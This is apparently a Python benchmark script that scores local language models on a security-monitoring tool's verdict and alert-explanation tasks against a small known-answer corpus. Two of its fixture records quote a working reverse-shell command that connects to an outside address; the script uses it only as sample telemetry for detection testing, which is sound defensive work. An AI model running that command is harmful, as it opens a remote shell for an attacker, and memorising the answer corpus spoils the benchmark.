"""Model benchmark (V0.6c "Model currency"): the SIEM's own AI task set
across candidate local SLMs, scored against a known-answer corpus.

Method (documented in docs/MODEL_BENCHMARK.md alongside the results):
  - Tasks = the two production AI tasks:
      1. VERDICT drafts -- the investigator's VERDICT_SYSTEM_PROMPT,
         temperature 0.0, max_tokens 700 (the exact production invocation)
         over four known-answer investigation records
         (2 malicious -> true_positive, 2 benign -> benign).
      2. Triage explanations -- the versioned alert-explanation renderer
         + ALERT_EXPLANATION_SYSTEM over two alert shapes.
  - The REAL client path: src.ai.ollama_client.query_llm with
    settings.ollama_model swapped per candidate (the same call the API
    and agents make). The ONLY difference from production is that the
    ai_usage persistence step is skipped (a benchmark must not pollute
    the standing volume's usage telemetry).
  - Responses go through the same robustness step any model swap would
    need: strip <think> blocks (Qwen-family soft-switch models), then
    extract the first balanced JSON object.

Scoring per model:
  verdict_agreement  -- parsed verdict == known answer (mean over runs)
  contract_validity  -- output parses to the closed verdict contract
                        (keys + vocabulary), independent of correctness
  explanation_ok     -- source == ollama (no fallback) AND grounded
                        (mentions >=1 concrete entity from the alert)
  latency_ms         -- mean per call (model warm)
  size_gb            -- model weight size (ollama /api/tags)

Composite (advisory only, the table is the evidence):
  quality = 0.6*agreement + 0.2*validity + 0.2*explanation_ok   (0..1)
  quality_per_gb = quality / size_gb

Usage:
  python -m scripts.model_benchmark \
      --models mistral:7b phi4-mini qwen3.5:2b qwen3.5:9b \
      --runs-per-case 2 --out runs

Exit code 0 when all models completed.
"""

from __future__ import annotations

import asyncio
import json
import re
import statistics
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO_ROOT))

import httpx  # noqa: E402

# The investigator's verdict system prompt is imported verbatim -- the
# benchmark must exercise the production prompt, not a lookalike.
from src.agents.investigator import VERDICT_SYSTEM_PROMPT  # noqa: E402
from src.ai.ollama_client import query_llm  # noqa: E402
from src.ai.prompts import ALERT_EXPLANATION_SYSTEM  # noqa: E402
from src.ai.untrusted import fence  # noqa: E402
from src.config.settings import settings  # noqa: E402

OLLAMA_URL = settings.ollama_base_url


# ───────────────────────────────────────────────────────────────
# Known-answer corpus (the purple-loop shapes, hand-built)
# ───────────────────────────────────────────────────────────────

VERDICT_CASES: list[dict] = [
    {
        "name": "reverse_shell",
        "known_answer": "true_positive",
        "objective": "Investigate alert 412: Reverse Shell (critical) on web-prod-01",
        "evidence": [
            '{"table": "es_process_events", "event": "exec", "path": "/bin/sh", '
            '"cmdline": "sh -i >& /dev/tcp/203.0.113.50/4444 0>&1", "parent_path": '
            '"/bin/bash", "cwd": "/tmp/.cache", "signing_id": null, '
            '"time": "2026-09-13T02:14:03Z"}',
            '{"table": "process_open_sockets", "remote_address": "203.0.113.50", '
            '"remote_port": "4444", "pid": "4242", "name": "sh"}',
            '{"table": "listening_ports", '
            '"note": "no listener on 4444 before the outbound connection"}',
            '{"table": "crontab", "note": "no persistence entries for the /tmp/.cache path"}',
        ],
    },
    {
        "name": "brute_force_to_success",
        "known_answer": "true_positive",
        "objective": "Investigate correlation brute_force_to_success on web-prod-02",
        "evidence": [
            '{"table": "auth_shipper", "action": "auth_failed", '
            '"user_name": "admin", "source_ip": "198.51.100.23", '
            '"count": 5, "window": "10m"}',
            '{"table": "auth_shipper", "action": "auth_success", '
            '"user_name": "admin", "source_ip": "198.51.100.23", '
            '"time": "2026-09-13T03:02:11Z"}',
            '{"table": "processes", "name": "ssh", '
            '"cmdline": "ssh admin@198.51.100.23", '
            '"note": "interactive client from the same host"}',
        ],
    },
    {
        "name": "backup_job",
        "known_answer": "benign",
        "objective": "Investigate process_start alert: backup.sh spawn on db-prod-01",
        "evidence": [
            '{"table": "es_process_events", "event": "exec", '
            '"path": "/usr/local/bin/backup.sh", "parent_path": "launchd", '
            '"time": "02:00:00Z", "note": "matches the documented '
            '02:00 daily backup schedule"}',
            '{"table": "es_process_events", "event": "exec", "path": "/usr/bin/tar", '
            '"cmdline": "tar -czf /var/backups/db-2026-09-13.tgz /var/lib/db", '
            '"parent": "backup.sh"}',
            '{"table": "process_open_sockets", '
            '"note": "no external destinations; local disk writes only"}',
        ],
    },
    {
        "name": "health_check",
        "known_answer": "benign",
        "objective": "Investigate repeated curl processes on the SIEM host",
        "evidence": [
            '{"table": "processes", "name": "curl", '
            '"cmdline": "curl -s http://127.0.0.1:8000/api/v1/health", '
            '"uid": "501", "note": "runs every 60s", '
            '"parent": "com.scarletai.health-watchdog"}',
            '{"table": "process_open_sockets", '
            '"remote_address": "127.0.0.1", "remote_port": "8000"}',
            '{"table": "file_events", '
            '"note": "no file modifications outside the watchdog state file"}',
        ],
    },
]

EXPLANATION_CASES: list[dict] = [
    {
        "name": "reverse_shell_alert",
        "rule_name": "reverse_shell_pattern",
        "rule_description": "Command-line reverse shell constructs detected",
        "severity": "critical",
        "host_name": "web-prod-01",
        "mitre_techniques": ["T1059.004", "T1071"],
        "entities": ["/bin/sh", "web-prod-01"],
        "evidence": {
            "process_name": "sh",
            "cmdline": "sh -i >& /dev/tcp/203.0.113.50/4444 0>&1",
            "source_ip": "203.0.113.50",
            "port": 4444,
        },
        "related_logs_count": 3,
    },
    {
        "name": "brute_force_alert",
        "rule_name": "ssh_success_after_failures",
        "rule_description": "Successful login after repeated failures from one source",
        "severity": "critical",
        "host_name": "web-prod-02",
        "mitre_techniques": ["T1110"],
        "entities": ["198.51.100.23", "web-prod-02"],
        "evidence": {"failed_count": 5, "source_ip": "198.51.100.23", "user": "admin"},
        "related_logs_count": 6,
    },
]


# ───────────────────────────────────────────────────────────────
# Robust JSON extraction (the step ANY swapped model needs)
# ───────────────────────────────────────────────────────────────

_THINK_RE = re.compile(r"<think>.*?</think>", re.DOTALL)


def extract_json(text: str) -> dict | None:
    """Extract the first balanced JSON object from a model response.

    Model-robustness step, deliberately model-agnostic: some families wrap
    output in <think> reasoning blocks; some prepend prose. Find the first
    balanced {...} and parse it. Nothing found -> None (contract failure).
    """
    cleaned = _THINK_RE.sub("", text).strip()
    start = cleaned.find("{")
    while start != -1:
        depth = 0
        in_str = False
        esc = False
        for i in range(start, len(cleaned)):
            ch = cleaned[i]
            if esc:
                esc = False
                continue
            if ch == "\\":
                esc = True
                continue
            if ch == '"':
                in_str = not in_str
                continue
            if in_str:
                continue
            if ch == "{":
                depth += 1
            elif ch == "}":
                depth -= 1
                if depth == 0:
                    candidate = cleaned[start : i + 1]
                    try:
                        obj = json.loads(candidate)
                        return obj if isinstance(obj, dict) else None
                    except json.JSONDecodeError:
                        break
        start = cleaned.find("{", start + 1)
    return None


async def _model_size_gb(model: str) -> float:
    """Model weight size (GB) from Ollama's /api/tags; 0.0 when unknown."""
    try:
        async with httpx.AsyncClient(timeout=10) as client:
            r = await client.get(f"{OLLAMA_URL}/api/tags")
            r.raise_for_status()
            data = r.json()
        models = data.get("models", [])
        for m in models:  # exact tag first (qwen3.5:2b must not hit 9b's size)
            if m.get("name") == model:
                return round(m.get("size", 0) / 1e9, 2)
        base = model.split(":")[0]
        for m in models:
            if m.get("name", "").split(":")[0] == base:
                return round(m.get("size", 0) / 1e9, 2)
    except Exception:  # noqa: BLE001, S110 -- size metadata advisory, never fatal
        pass
    return 0.0


async def _unload(model: str) -> None:
    """Free the previous model so RAM measurements stay per-candidate."""
    import httpx

    try:
        async with httpx.AsyncClient(timeout=30) as client:
            await client.post(f"{OLLAMA_URL}/api/generate", json={"model": model, "keep_alive": 0})
    except Exception:  # noqa: BLE001, S110 -- unload is best-effort cleanup
        pass


async def _warmup(model: str) -> float:
    """Load the model with a 1-token generate; returns load seconds."""
    import httpx

    start = time.monotonic()
    async with httpx.AsyncClient(timeout=settings.ollama_timeout) as client:
        await client.post(
            f"{OLLAMA_URL}/api/generate",
            json={
                "model": model,
                "prompt": "ping",
                "stream": False,
                "options": {"num_predict": 1},
            },
        )
    return round(time.monotonic() - start, 1)


async def run_verdict_case(case: dict, system_suffix: str = "", think: bool | None = None) -> dict:
    """One verdict call through the production invocation contract."""
    evidence_package = "\n\n".join(fence(e, label="telemetry") for e in case["evidence"])
    prompt = (
        f"Investigation objective: {fence(case['objective'], label='objective')}\n\n"
        f"Investigation plan hypotheses: "
        f"{fence(json.dumps([case['name'].replace('_', ' ')]), label='hypotheses')}\n\n"
        f"Evidence:\n{evidence_package}\n\n"
        "Produce the verdict draft JSON now."
    )
    result = await query_llm(
        prompt=prompt,
        system_prompt=VERDICT_SYSTEM_PROMPT + system_suffix,
        temperature=0.0,
        max_tokens=700,
        prompt_version="model_benchmark_verdict_v1",
        think=think,
    )
    prod_sla_ms = 30_000  # the production client's ollama_timeout ceiling
    return {
        "latency_ms": result.latency_ms,
        "raw": result.text,
        "ok": result.ok,
        "prod_sla_ok": result.ok and result.latency_ms < prod_sla_ms,
    }


async def run_explanation_case(
    case: dict, system_suffix: str = "", think: bool | None = None
) -> dict:
    """One explanation call through the production prompt renderer."""
    from src.ai.alert_explanation import render_alert_explanation

    evidence_str = fence(
        json.dumps(case["evidence"], indent=2, default=str)[:500],
        label="alert evidence JSON (ingest-fed log data)",
    )
    prompt, prompt_version, _ = render_alert_explanation(
        rule_name=case["rule_name"],
        rule_description=case["rule_description"],
        severity=case["severity"],
        host_name=fence(case["host_name"], label="host name (ingest-fed, attacker-influenced)"),
        mitre_techniques=case["mitre_techniques"],
        evidence_str=evidence_str,
        related_logs_count=case["related_logs_count"],
    )
    result = await query_llm(
        prompt=prompt,
        system_prompt=ALERT_EXPLANATION_SYSTEM + system_suffix,
        temperature=0.2,
        max_tokens=512,
        prompt_version="model_benchmark_explanation_v1",
        think=think,
    )
    prod_sla_ms = 30_000
    return {
        "latency_ms": result.latency_ms,
        "raw": result.text,
        "source": result.source,
        "prod_sla_ok": result.source == "ollama" and result.latency_ms < prod_sla_ms,
    }


async def benchmark_model(
    model: str,
    runs_per_case: int,
    timeout_s: int = 120,
    system_suffix: str = "",
    think: bool | None = None,
) -> dict:
    """Benchmark ONE candidate; returns its scorecard dict."""
    settings.ollama_model = model  # the production path swap
    settings.ollama_timeout = timeout_s  # benchmark headroom; prod SLA tracked separately
    load_s = await _warmup(model)
    size_gb = await _model_size_gb(model)

    verdict_runs: list[dict] = []
    for case in VERDICT_CASES:
        for _ in range(runs_per_case):
            r = await run_verdict_case(case, think=think)
            parsed = extract_json(r["raw"])
            verdict = parsed.get("verdict") if parsed else None
            contract_ok = bool(
                parsed
                and parsed.get("verdict")
                in ("true_positive", "false_positive", "benign", "needs_review")
                and isinstance(parsed.get("confidence"), (int, float))
                and "rationale" in parsed
                and "evidence" in parsed
                and "recommendation" in parsed
            )
            verdict_runs.append(
                {
                    "case": case["name"],
                    "known": case["known_answer"],
                    "verdict": verdict,
                    "agree": verdict == case["known_answer"],
                    "contract_ok": contract_ok,
                    "latency_ms": r["latency_ms"],
                    "prod_sla_ok": r["prod_sla_ok"],
                    "raw_snippet": r["raw"][:400],
                }
            )

    explanation_runs: list[dict] = []
    for case in EXPLANATION_CASES:
        for _ in range(runs_per_case):
            r = await run_explanation_case(case, think=think)
            grounded = any(e in r["raw"] for e in case["entities"])
            explanation_runs.append(
                {
                    "case": case["name"],
                    "source": r["source"],
                    "grounded": grounded,
                    "ok": r["source"] == "ollama" and grounded,
                    "latency_ms": r["latency_ms"],
                    "prod_sla_ok": r["prod_sla_ok"],
                    "raw_snippet": r["raw"][:400],
                }
            )

    agreement = statistics.mean(r["agree"] for r in verdict_runs)
    validity = statistics.mean(r["contract_ok"] for r in verdict_runs)
    explanation_ok = statistics.mean(r["ok"] for r in explanation_runs)
    verdict_lat = statistics.mean(r["latency_ms"] for r in verdict_runs)
    expl_lat = statistics.mean(r["latency_ms"] for r in explanation_runs)
    prod_sla = statistics.mean(r["prod_sla_ok"] for r in verdict_runs + explanation_runs)

    quality = 0.6 * agreement + 0.2 * validity + 0.2 * explanation_ok
    return {
        "model": model,
        "system_suffix": system_suffix,
        "think": think,
        "benchmark_timeout_s": timeout_s,
        "size_gb": size_gb,
        "load_s": load_s,
        "verdict_agreement": round(agreement, 3),
        "contract_validity": round(validity, 3),
        "explanation_ok": round(explanation_ok, 3),
        "prod_sla_ok": round(prod_sla, 3),
        "latency_verdict_ms": round(verdict_lat),
        "latency_explanation_ms": round(expl_lat),
        "quality": round(quality, 3),
        "quality_per_gb": round(quality / size_gb, 3) if size_gb else None,
        "verdict_runs": verdict_runs,
        "explanation_runs": explanation_runs,
    }


def render_table(scorecards: list[dict]) -> str:
    cols = (
        "model",
        "size_gb",
        "agreement",
        "validity",
        "explain",
        "prod_sla",
        "lat_v_ms",
        "lat_e_ms",
        "quality",
        "q_per_gb",
    )
    header = "| " + " | ".join(cols) + " |"
    sep = "|" + "|".join("---" for _ in cols) + "|"
    rows = []
    for s in scorecards:
        if "error" in s:
            rows.append(f"| {s['model']} | ERROR |" + " |" * 9)
            continue
        rows.append(
            "| {model} | {size_gb} | {verdict_agreement} | {contract_validity} | "
            "{explanation_ok} | {prod_sla_ok} | {latency_verdict_ms} | "
            "{latency_explanation_ms} | {quality} | {qpgb} |".format(
                model=s["model"],
                size_gb=s["size_gb"],
                verdict_agreement=s["verdict_agreement"],
                contract_validity=s["contract_validity"],
                explanation_ok=s["explanation_ok"],
                prod_sla_ok=s["prod_sla_ok"],
                latency_verdict_ms=s["latency_verdict_ms"],
                latency_explanation_ms=s["latency_explanation_ms"],
                quality=s["quality"],
                qpgb=s["quality_per_gb"] if s["quality_per_gb"] is not None else "n/a",
            )
        )
    return "\n".join([header, sep, *rows])


async def main() -> int:
    import argparse

    parser = argparse.ArgumentParser(description="V0.6c model benchmark")
    parser.add_argument(
        "--models",
        nargs="+",
        default=["mistral:7b", "phi4-mini", "qwen3.5:2b", "qwen3.5:9b"],
        help="candidate models (first = the incumbent)",
    )
    parser.add_argument("--runs-per-case", type=int, default=2)
    parser.add_argument(
        "--timeout-s",
        type=int,
        default=120,
        help="benchmark generation timeout (headroom); the PRODUCTION SLA "
        "(settings.ollama_timeout default 30s) is tracked separately as prod_sla_ok",
    )
    parser.add_argument(
        "--system-suffix",
        default="",
        help="appended to every system prompt this run (e.g. Qwen /no_think for a "
        "configured-candidate variant); recorded in the results",
    )
    parser.add_argument(
        "--think-false",
        action="store_true",
        help="pass think=false to Ollama (the configured-candidate form for "
        "thinking-capable models; the live 2026-09-13 finding: their thinking "
        "phase otherwise exhausts the token budget and returns empty text)",
    )
    parser.add_argument("--out", default="runs")
    args = parser.parse_args()

    scorecards = []
    for i, model in enumerate(args.models):
        print(f"[benchmark] {model} ({i + 1}/{len(args.models)}) loading + running...", flush=True)
        try:
            s = await benchmark_model(
                model,
                args.runs_per_case,
                args.timeout_s,
                args.system_suffix,
                think=False if args.think_false else None,
            )
        except Exception as e:  # noqa: BLE001 -- a candidate failing must not kill the run
            print(f"[benchmark] {model} FAILED: {e}", file=sys.stderr)
            scorecards.append({"model": model, "error": str(e)})
            continue
        await _unload(model)
        scorecards.append(s)
        print(
            f"[benchmark] {model}: agreement={s['verdict_agreement']} "
            f"validity={s['contract_validity']} explanation={s['explanation_ok']} "
            f"prod_sla={s['prod_sla_ok']} quality={s['quality']} ({s['size_gb']}GB)",
            flush=True,
        )

    out_dir = (
        REPO_ROOT
        / args.out
        / f"model-benchmark-{datetime.now(timezone.utc).strftime('%Y%m%dT%H%M%SZ')}"
    )
    out_dir.mkdir(parents=True, exist_ok=True)
    (out_dir / "results.json").write_text(json.dumps(scorecards, indent=2))
    (out_dir / "table.md").write_text(render_table(scorecards) + "\n")
    print(f"[benchmark] artifacts -> {out_dir}", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(asyncio.run(main()))
